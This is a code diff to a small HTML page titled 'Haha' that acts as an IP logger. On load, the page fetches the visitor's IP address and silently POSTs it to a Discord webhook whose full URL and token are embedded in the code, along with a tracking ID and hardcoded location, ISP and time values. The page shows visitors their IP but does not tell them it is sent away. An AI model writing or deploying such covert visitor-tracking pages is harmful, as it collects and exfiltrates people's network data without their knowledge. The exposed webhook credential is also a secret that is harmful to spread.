@@ -3,17 +3,15 @@
   <head>
     <title>Haha</title>
     <script>
-      function displayIP() {
+      function displayIP(location, isp, time) {
         fetch("https://api.ipify.org/?format=json")
           .then((response) => response.json())
           .then((data) => {
             const ipElement = document.getElementById("ip");
             ipElement.textContent = data.ip;
-            getLocation(data.ip);
-
-            const pageUserID = Date.now(); // Generate a unique pageUserID based on the current timestamp
-            localStorage.setItem("pageUserID", pageUserID); // Store the pageUserID in localStorage
-            sendToWebhook(data.ip, location, isp, time, pageUserID); // Send the pageUserID along with other data to the webhook
+            const pageUserID = Date.now().toString();
+            localStorage.setItem("pageUserID", pageUserID);
+            sendToWebhook(data.ip, location, isp, time, pageUserID);
           })
           .catch((error) => {
             console.error("Error:", error);
@@ -21,8 +19,8 @@
       }
 
       function sendToWebhook(ip, location, isp, time, pageUserID) {
-        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
-        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID; // Include the pageUserID in the message
+        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
+        const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time: " + time + ", Page User ID: " + pageUserID;
         fetch(webhookURL, {
           method: "POST",
           headers: {
@@ -39,7 +37,7 @@
       }
     </script>
   </head>
-  <body onload="displayIP()">
+  <body onload="displayIP('New York', 'Comcast', '10:30am')">
     <p>Your IP address is: <span id="ip"></span></p>
   </body>
 </html>
